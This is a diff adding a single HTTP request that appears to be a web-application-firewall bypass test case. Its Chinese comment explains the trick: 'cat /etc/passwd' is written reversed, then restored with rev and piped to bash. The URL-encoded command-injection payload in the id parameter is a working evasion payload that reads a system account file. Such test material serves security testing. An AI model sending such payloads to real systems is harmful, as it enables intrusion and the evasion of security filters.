@@ -1,0 +1,9 @@
+# 命令执行(反转绕过)
+# 将命令 cat /etc/passwd进行字符串反转隐藏特征，利用管道符和linux命令还原反转的字符串并执行命令。
+GET /?id=echo%20%22dwssap%2Fcte%2F%20tac%22%20%7C%20rev%20%7C%20bash&bid=hd_tag_m8mv247l HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv247l
+RM-PRO-Token: 7954aecf5ecea68c1ed1585f91786866
+RM-PRO-Time: 1742808367205
+User-Agent: curl/7.83.1
+
